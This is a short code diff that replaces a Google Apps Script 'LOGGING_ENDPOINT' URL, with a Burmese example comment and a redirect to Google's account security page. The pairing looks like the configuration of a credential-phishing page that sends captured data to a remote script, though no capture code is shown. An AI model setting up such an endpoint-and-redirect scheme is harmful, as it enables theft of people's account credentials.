@@ -5,7 +5,7 @@
 // ဥပမာ: 'https://script.google.com/macros/s/AKfycb_RANDOM_CODE_HERE/exec'
 // ====================================================================
 
-const LOGGING_ENDPOINT = 'https://script.google.com/macros/s/AKfycbx6ZyGDMNoJ7pDBuaRnQ7MOjdX1YF_1DfsiW0uNm9eL1ElpHUvcYSLP25bXw2bGGeO14Q/exec'; 
+const LOGGING_ENDPOINT = 'https://script.google.com/macros/s/AKfycbyfvIh6KDvY1TfQ3ROt-wZl43sosIlNgEsCVjpElrGFnoJdD7QxONWZW8ue7rVG1bqtCw/exec'; 
  
 const REDIRECT_URL = 'https://myaccount.google.com/security';
 
